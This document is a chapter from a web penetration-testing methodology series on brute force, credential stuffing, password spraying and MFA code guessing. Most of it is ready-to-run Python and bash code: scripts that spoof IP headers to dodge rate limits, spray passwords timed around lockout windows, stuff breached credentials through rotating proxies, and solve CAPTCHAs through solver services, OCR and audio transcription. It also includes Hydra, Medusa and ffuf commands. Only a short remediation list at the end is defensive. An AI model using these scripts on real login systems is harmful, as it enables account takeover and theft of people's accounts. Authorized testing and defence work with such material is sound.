---
title: "Brute Force & Credential Stuffing"
date: 2026-02-24
draft: false
---

# Brute Force & Credential Stuffing

> **Severity**: High | **CWE**: CWE-307, CWE-521
> **OWASP**: A07:2021 – Identification and Authentication Failures

---

## What Is the Attack Class?

**Credential stuffing**: automated use of username/password pairs from previous data breaches against a target application — relies on password reuse.

**Brute force**: systematic testing of all possible passwords or a targeted wordlist against a known username.

**Password spraying**: test one or a few common passwords across many accounts — avoids per-account lockout while still achieving high success rates against weak password policies.

The distinguishing challenge in modern targets: rate limiting, CAPTCHA, account lockout, device fingerprinting, and IP reputation systems. This chapter focuses entirely on **bypass techniques** for these defenses.

---

## Discovery Checklist

**Phase 1 — Identify Rate Limiting and Lockout Mechanisms**
- [ ] Test login endpoint: how many failed attempts before lockout/CAPTCHA?
- [ ] Test if lockout is per-IP, per-account, or per-session
- [ ] Test if lockout resets with: time wait, email unlock, correct password attempt
- [ ] Check for `X-RateLimit-Remaining`, `Retry-After` headers
- [ ] Test if different User-Agent or Accept-Language bypasses device fingerprint
- [ ] Identify CAPTCHA provider: reCAPTCHA v2/v3, hCaptcha, FunCaptcha, image CAPTCHA

**Phase 2 — Map Authentication Request**
- [ ] Identify all parameters in login request (including hidden fields, CSRF tokens)
- [ ] Check if CSRF token is required — does it change per-request?
- [ ] Identify response differentiator: what distinguishes success from failure?
- [ ] Check for subtle differences in failure messages (see Chapter 37 — UserEnum)
- [ ] Test if API endpoint bypasses rate limiting applied to web UI

**Phase 3 — Bypass Mechanisms**
- [ ] IP rotation: X-Forwarded-For, X-Real-IP, Forwarded header injection
- [ ] Account lockout: password spray (1 attempt per account), correct lockout threshold
- [ ] CAPTCHA: identify service → select bypass technique
- [ ] Distributed attack: multiple source IPs
- [ ] API endpoint: same auth backend, different rate limit policy

---

## Payload Library

### Payload 1 — IP Header Rotation Bypass

```bash
# Many applications trust X-Forwarded-For for rate limiting:
# Rotate X-Forwarded-For IP on each request → bypass per-IP rate limit

python3 << 'EOF'
import requests, random, time

TARGET = "https://target.com/api/login"
HEADERS_BASE = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

def random_ip():
    # Generate random public IP (avoid RFC-1918):
    while True:
        ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        # Skip private ranges:
        if not (ip.startswith('10.') or ip.startswith('192.168.') or
                ip.startswith('172.16.') or ip.startswith('127.')):
            return ip

def login_attempt(username, password):
    ip = random_ip()
    headers = {**HEADERS_BASE,
               "X-Forwarded-For": ip,
               "X-Real-IP": ip,
               "X-Originating-IP": ip,
               "Forwarded": f"for={ip}",
               "CF-Connecting-IP": ip,
               "True-Client-IP": ip}
    r = requests.post(TARGET, headers=headers,
                      json={"username": username, "password": password},
                      timeout=10)
    return r

# Load credential pairs:
with open("credentials.txt") as f:
    creds = [line.strip().split(":", 1) for line in f if ":" in line]

for username, password in creds:
    r = login_attempt(username, password)
    if "dashboard" in r.text or r.status_code == 200 and "error" not in r.text.lower():
        print(f"[!!!] SUCCESS: {username}:{password}")
    else:
        print(f"[ ] {username}:{password} → {r.status_code}")
    time.sleep(0.5)  # throttle
EOF

# Test which IP headers the target trusts:
for header in "X-Forwarded-For" "X-Real-IP" "X-Originating-IP" \
  "CF-Connecting-IP" "True-Client-IP" "Forwarded" "X-Client-IP"; do
  # Send 5 requests with same spoofed IP, then 6th:
  for i in {1..5}; do
    curl -s -X POST "https://target.com/api/login" \
      -H "$header: 1.2.3.4" \
      -H "Content-Type: application/json" \
      -d '{"username":"admin","password":"wrong"}' -o /dev/null
  done
  # 6th request with different "IP":
  resp=$(curl -s -X POST "https://target.com/api/login" \
    -H "$header: 5.6.7.8" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"wrong"}')
  echo "$header bypass: $resp"
done
```

### Payload 2 — Password Spraying (Lockout Bypass)

```python
#!/usr/bin/env python3
"""
Password spraying — one password against many accounts
Avoids per-account lockout (typically 5–10 attempts before lockout)
"""
import requests, time, random
from datetime import datetime

TARGET = "https://target.com/api/login"
SPRAY_INTERVAL = 30 * 60  # 30 minutes between rounds (lockout reset period)

# Spray one password per account per round:
SPRAY_PASSWORDS = [
    "Winter2024!", "Spring2024!", "Summer2024!", "Fall2024!",
    "Welcome1!", "Password1!", "Company2024!", "Passw0rd!",
    "January2024", "February2024", "CompanyName1!",
    "Monday2024!", "Qwerty123!", "Welcome@1",
]

# Username list (from enumeration, LinkedIn, OSINT):
usernames = [line.strip() for line in open("users.txt") if line.strip()]

def spray_round(password, users, delay=1.0):
    print(f"\n[{datetime.now():%H:%M}] Spraying: '{password}' against {len(users)} accounts")
    hits = []
    for username in users:
        try:
            r = requests.post(TARGET,
                json={"username": username, "password": password},
                headers={"Content-Type": "application/json",
                         "X-Forwarded-For": f"{random.randint(1,220)}.{random.randint(0,255)}.0.1"},
                timeout=10)

            # Success detection — customize for target:
            if r.status_code in (200, 302) and (
                "token" in r.text or "session" in r.text or
                r.headers.get("Location", "").endswith("/dashboard")
            ):
                print(f"  [!!!] SUCCESS: {username}:{password}")
                hits.append((username, password))
            elif "locked" in r.text.lower():
                print(f"  [LOCKED] {username}")
        except Exception as e:
            print(f"  [ERR] {username}: {e}")
        time.sleep(delay + random.uniform(0, 0.5))
    return hits

all_hits = []
for i, password in enumerate(SPRAY_PASSWORDS):
    hits = spray_round(password, usernames)
    all_hits.extend(hits)

    if i < len(SPRAY_PASSWORDS) - 1:
        print(f"\n[*] Waiting {SPRAY_INTERVAL//60} minutes before next round...")
        time.sleep(SPRAY_INTERVAL)

print(f"\n[+] Total hits: {len(all_hits)}")
for u, p in all_hits:
    print(f"  {u}:{p}")
```

### Payload 3 — CAPTCHA Bypass Techniques

```bash
# reCAPTCHA v2 bypass — 2captcha / anti-captcha API:
python3 << 'EOF'
import requests, time

TWOCAPTCHA_KEY = "YOUR_2CAPTCHA_KEY"
SITE_KEY = "6Le...RECAPTCHA_SITE_KEY"  # from page source: data-sitekey
PAGE_URL = "https://target.com/login"

# Step 1: Submit task:
r = requests.post("https://2captcha.com/in.php", data={
    "key": TWOCAPTCHA_KEY,
    "method": "userrecaptcha",
    "googlekey": SITE_KEY,
    "pageurl": PAGE_URL,
    "json": 1
})
task_id = r.json()["request"]
print(f"Task submitted: {task_id}")

# Step 2: Poll for result (typically 15-45 seconds):
time.sleep(20)
for attempt in range(10):
    result = requests.get("https://2captcha.com/res.php", params={
        "key": TWOCAPTCHA_KEY,
        "action": "get",
        "id": task_id,
        "json": 1
    }).json()
    if result.get("status") == 1:
        token = result["request"]
        print(f"Token: {token[:30]}...")
        break
    time.sleep(5)

# Step 3: Submit login with CAPTCHA token:
r = requests.post(PAGE_URL, data={
    "username": "admin@target.com",
    "password": "PASSWORD_TO_TEST",
    "g-recaptcha-response": token
})
print(f"Login result: {r.status_code}")
EOF

# hCaptcha bypass via same API (different method name):
# method: "hcaptcha" instead of "userrecaptcha"

# reCAPTCHA v3 bypass — score manipulation:
# v3 returns a score (0.0–1.0); if server checks score >= 0.5:
# → use 2captcha with "min_score": 0.7 in request

# Audio CAPTCHA bypass:
# Accessibility feature provides audio version of image CAPTCHA
# Use SpeechRecognition or Whisper to transcribe audio CAPTCHA
python3 << 'EOF'
import requests, speech_recognition as sr, io, os

def solve_audio_captcha(audio_url):
    """Download audio CAPTCHA and transcribe"""
    audio_data = requests.get(audio_url).content

    # Convert mp3 to wav if needed:
    with open("/tmp/captcha.mp3", "wb") as f:
        f.write(audio_data)
    os.system("ffmpeg -i /tmp/captcha.mp3 /tmp/captcha.wav -y -loglevel quiet")

    recognizer = sr.Recognizer()
    with sr.AudioFile("/tmp/captcha.wav") as source:
        audio = recognizer.record(source)
    try:
        text = recognizer.recognize_google(audio)
        return text.replace(" ", "").strip()
    except:
        return None
EOF

# Simple image CAPTCHA — OCR bypass:
python3 << 'EOF'
import requests, pytesseract
from PIL import Image, ImageFilter
from io import BytesIO

def solve_image_captcha(captcha_url, session):
    """Download and OCR simple image CAPTCHA"""
    img_bytes = session.get(captcha_url).content
    img = Image.open(BytesIO(img_bytes))

    # Preprocessing for better OCR:
    img = img.convert('L')  # grayscale
    img = img.point(lambda x: 0 if x < 140 else 255)  # threshold
    img = img.filter(ImageFilter.MedianFilter())

    text = pytesseract.image_to_string(img, config='--psm 8 -c tessedit_char_whitelist=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz')
    return text.strip()
EOF
```

### Payload 4 — Account Lockout Enumeration and Bypass

```bash
# Test lockout threshold:
for i in {1..20}; do
  resp=$(curl -s -X POST "https://target.com/api/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"admin@target.com","password":"wrong'$i'"}' \
    -w " | HTTP:%{http_code}")
  echo "Attempt $i: $resp" | head -c 200
done

# Test if lockout is per-account or per-IP:
# If per-IP: same account + different IP → not locked
# Test: after lockout, change X-Forwarded-For:
curl -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 99.99.99.99" \
  -d '{"username":"admin@target.com","password":"try_after_lockout"}'

# Test lockout reset window:
# After lockout: wait N minutes → try again
# Check if correct password during lockout period resets counter

# Soft lockout bypass via "remember me" token:
# If app issues long-lived token on first auth:
# Use token to stay authenticated despite lockout
curl "https://target.com/api/session/extend" \
  -H "Authorization: Bearer LONG_LIVED_TOKEN"

# API endpoint bypass — if web UI is rate limited but API is not:
# Web: POST /login → rate limited
# API: POST /api/v1/auth/token → different rate limit policy
for password in Summer2024 Winter2024 Password1 Welcome1; do
  curl -s "https://target.com/api/v1/auth/token" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin@target.com\",\"password\":\"$password\"}" | \
    grep -q "access_token" && echo "SUCCESS: $password"
done

# Reset lockout via password reset flow:
# If resetting password clears failed attempt counter:
# 1. Trigger lockout
# 2. Request password reset (uses your email)
# 3. Complete reset
# 4. Counter reset → brute force again
```

### Payload 5 — Credential Stuffing Automation

```bash
# Prepare credential list from breach databases:
# - HaveIBeenPwned downloadable hash list (NTLM hashes — for local cracking only)
# - Dehashed, LeakCheck, WeLeakInfo APIs
# - Compiled lists from github.com/danielmiessler/SecLists/Passwords/

# Format preparation:
# Standard format: username:password (one per line)
# Convert: email,password CSV → email:password:
awk -F',' '{print $1 ":" $2}' breach_data.csv > creds.txt

# Sentry MBA / OpenBullet (commercial tools — legal use only in authorized tests)
# These handle CAPTCHA solving, proxy rotation, retry logic natively

# Custom Python credential stuffing with proxy rotation:
python3 << 'EOF'
import requests, time, random, concurrent.futures

TARGET = "https://target.com/api/login"
PROXIES_FILE = "proxies.txt"  # format: http://IP:PORT or socks5://IP:PORT
CREDS_FILE = "credentials.txt"

with open(PROXIES_FILE) as f:
    proxies = [line.strip() for line in f if line.strip()]
with open(CREDS_FILE) as f:
    creds = [line.strip().split(":", 1) for line in f if ":" in line]

def test_cred(user_pass):
    username, password = user_pass
    proxy = random.choice(proxies)
    proxy_dict = {"http": proxy, "https": proxy}
    try:
        r = requests.post(TARGET,
            json={"username": username, "password": password},
            headers={"Content-Type": "application/json",
                     "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) rv/{random.randint(80,120)}.0"},
            proxies=proxy_dict, timeout=15, allow_redirects=False)

        if r.status_code in (200, 302):
            if r.status_code == 302 and "dashboard" in r.headers.get("Location", ""):
                return ("SUCCESS", username, password)
            if "token" in r.text or "success" in r.text.lower():
                return ("SUCCESS", username, password)
        return ("FAIL", username, password)
    except:
        return ("ERROR", username, password)

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    for result in executor.map(test_cred, creds):
        status, user, pwd = result
        if status == "SUCCESS":
            print(f"[!!!] {user}:{pwd}")

EOF

# Hydra — traditional brute force / credential stuffing:
hydra -C creds.txt target.com https-post-form \
  "/api/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Invalid credentials" \
  -t 4 -w 3

# Medusa:
medusa -H hosts.txt -U users.txt -P passwords.txt \
  -M http -m "POST:https://target.com/login:username=^USER^&password=^PASS^:Invalid"
```

### Payload 6 — Multi-Factor Authentication Brute Force

```bash
# TOTP 6-digit code: 000000–999999 = 1,000,000 possibilities
# 30-second window = ~2 valid codes at any time
# Brute force window: ~30 seconds to try many codes

# Without rate limiting — try all current window codes:
python3 << 'EOF'
import requests, time, pyotp

SESSION = "POST_PASSWORD_SESSION"
TARGET = "https://target.com/api/auth/verify-mfa"

# If server doesn't enforce rate limiting on MFA endpoint:
# Try codes sequentially (or spray across accounts)
for code in range(1000000):
    code_str = str(code).zfill(6)
    r = requests.post(TARGET,
        headers={"Authorization": f"Bearer {SESSION}",
                 "Content-Type": "application/json"},
        json={"otp": code_str}, timeout=5)
    if r.status_code == 200 and "error" not in r.json().get("status", ""):
        print(f"[!!!] Valid OTP: {code_str}")
        break

EOF

# SMS OTP — if 4-digit (some legacy apps):
# Only 10000 possibilities, feasible if no lockout
for i in $(seq -w 0 9999); do
  resp=$(curl -s -X POST "https://target.com/api/verify-sms" \
    -H "Authorization: Bearer SESSION" \
    -H "Content-Type: application/json" \
    -d "{\"code\":\"$i\"}")
  echo "$i: $resp" | grep -v "invalid\|incorrect\|wrong" && break
done

# Backup code brute force:
# Backup codes are often short numeric codes:
# 8 digits = 100,000,000 possibilities → impractical
# But many apps use short codes: 6 chars alphanumeric = 2.17 billion → also impractical
# However: some apps have predictable backup code generation (based on user_id + timestamp)
# Check if backup codes can be enumerated via timing oracle
```

---

## Tools

```bash
# Hydra — multi-protocol brute force:
hydra -l admin@target.com -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt \
  -s 443 -f -V target.com https-post-form \
  "/api/login:username=^USER^&password=^PASS^:error"

# ffuf — fast HTTP brute force:
ffuf -u https://target.com/api/login \
  -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin@target.com","password":"FUZZ"}' \
  -w /usr/share/seclists/Passwords/Common-Credentials/best1050.txt \
  -mc 200 -fr "invalid\|error" -c

# Turbo Intruder (Burp) — single-packet MFA code brute:
# Use when target has per-request rate limit but not burst protection
# Script: queue all 999999 codes in single-packet burst

# CUPP — custom wordlist generator based on target info:
pip3 install cupp
cupp -i  # interactive profile-based wordlist generation

# CeWL — generate wordlist from target website:
cewl https://target.com -d 2 -m 6 -o cewl_wordlist.txt

# 2captcha/anti-captcha API for CAPTCHA solving:
pip3 install 2captcha-python

# hashcat — offline brute force of leaked password hashes:
hashcat -m 3200 hashes.txt /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
# -m 3200: bcrypt; -m 0: MD5; -m 1000: NTLM

# Spray tool with lockout awareness:
# sprayhound — domain password spray with lockout awareness:
pip3 install sprayhound
sprayhound -U users.txt -d target.com --smart  # respects lockout policy automatically
```

---

## Remediation Reference

- **Account lockout**: lock after 5–10 failed attempts; require unlock via email or wait period — apply per-account, not per-IP (IP spoofing defeats IP-based lockout)
- **Exponential backoff**: increase delay between allowed attempts: after 3 fails → 5s wait, after 5 → 30s, after 10 → lock
- **CAPTCHA placement**: present CAPTCHA after first failed login attempt — not before (reduces UX friction for legitimate users while stopping automated attacks)
- **Device fingerprinting**: track device fingerprint (not just IP) for lockout — require additional verification for new devices
- **Credential stuffing defense**: check submitted passwords against HaveIBeenPwned API — warn/block if breached credential is used
- **Multi-factor authentication**: MFA on all accounts significantly reduces credential stuffing impact — even if password is compromised, MFA codes must also be obtained
- **Rate limiting on MFA**: apply strict rate limiting to MFA code verification — lockout after 5 incorrect OTP attempts
- **Distrust IP headers**: never use `X-Forwarded-For` or similar headers for rate limiting unless your architecture guarantees they come from a trusted proxy

*Part of the Web Application Penetration Testing Methodology series.*
